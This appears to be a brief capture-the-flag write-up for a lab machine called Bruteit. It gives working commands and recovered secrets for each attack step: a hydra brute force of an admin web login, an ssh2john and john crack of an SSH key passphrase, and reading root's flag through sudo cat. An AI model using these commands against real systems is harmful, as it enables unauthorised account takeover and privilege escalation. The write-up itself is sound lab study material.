# Bruteit
```
export ip = 10.10.192.48
```

## SCAN
```
22 ssh
80 http
```

## Web Enumeration
```
[Gobuster]
: Reference gbuster.log

[View Page Source]
USER_NAME is "admin"
```

## Web Brute Focing
```

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.48 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"

admin : xavier
```
## SSH Brute Forcing
```
ssh2john > hash
john hash --wordlist={ROCK_YOU}

:rockinroll
```

## PRIVILEGE ESCALATE
```
: sudo -l
: sudo /bin/cat /root/root.txt
```